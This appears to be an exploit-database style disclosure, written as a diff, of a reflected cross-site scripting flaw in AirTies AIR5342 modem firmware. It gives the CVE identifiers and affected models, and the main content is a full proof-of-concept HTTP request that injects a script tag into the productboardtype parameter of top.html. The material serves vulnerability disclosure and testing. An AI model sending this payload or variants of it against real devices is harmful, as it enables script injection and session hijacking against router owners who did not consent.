@@ -1,0 +1,23 @@
+# Exploit Title: Airties AIR5342 1.0.0.18 - Cross-Site Scripting
+# Date: 25-09-2018
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: [https://www.airties.com/]
+# Software [http://www.airties.com.tr/support/dcenter/]
+# Version: [1.0.0.18]
+# Affected products: AIR5342, AIR5343v2, AIR5443v2, AIR5453, AIR5442, AIR5750, AIR5650, AIR5021
+# Tested on: MacOS High Sierra / Linux Mint / Windows 10
+# CVE : CVE-2018-17593, CVE-2018-17590, CVE-2018-17591, CVE-2018-17588, CVE-2018-17587
+  
+# A cross site scripting vulnerability has been discovered in the AIR5342 modem of the AirTies manufacturer. 
+# AirTies Air 5342 devices have XSS via the top.html productboardtype parameter.  
+  
+# HTTP Requests :
+
+GET /top.html?page=main&productboardtype=%3Cscript%3Ealert(%22Ismail%20Tasdelen%22);%3C/script%3E HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
